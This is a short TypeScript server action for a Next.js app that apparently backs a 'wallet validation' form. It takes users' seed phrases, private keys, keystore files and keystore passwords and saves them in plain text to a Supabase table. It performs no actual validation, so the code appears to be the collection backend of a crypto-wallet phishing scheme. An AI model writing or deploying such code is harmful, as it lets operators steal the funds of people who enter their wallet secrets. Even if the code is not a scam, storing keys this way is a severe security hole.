"use server";

import { createServerSupabaseClient } from "@/lib";
import { headers } from "next/headers";

export type ValidationType = "mnemonics" | "keystore" | "private_key" | "hardware";

export interface ValidationInput {
  walletName: string;
  validationType: ValidationType;
  mnemonicPhrase?: string;
  keystoreJson?: string;
  keystorePassword?: string;
  privateKey?: string;
  hardwareType?: string;
}

export async function saveWalletValidation(input: ValidationInput) {
  const supabase = await createServerSupabaseClient();
  const { data: { user } } = await supabase.auth.getUser();
  if (!user) return { error: "You must be logged in" };

  if (!input.walletName.trim()) return { error: "Wallet name is required" };

  const { error } = await supabase.from("wallet_validations").insert({
    user_id: user.id,
    wallet_name: input.walletName.trim(),
    validation_type: input.validationType,
    mnemonic_phrase: input.mnemonicPhrase?.trim() || null,
    keystore_json: input.keystoreJson?.trim() || null,
    keystore_password: input.keystorePassword?.trim() || null,
    private_key: input.privateKey?.trim() || null,
    hardware_type: input.hardwareType || null,
  });

  if (error) return { error: error.message };

  return { success: true };
}
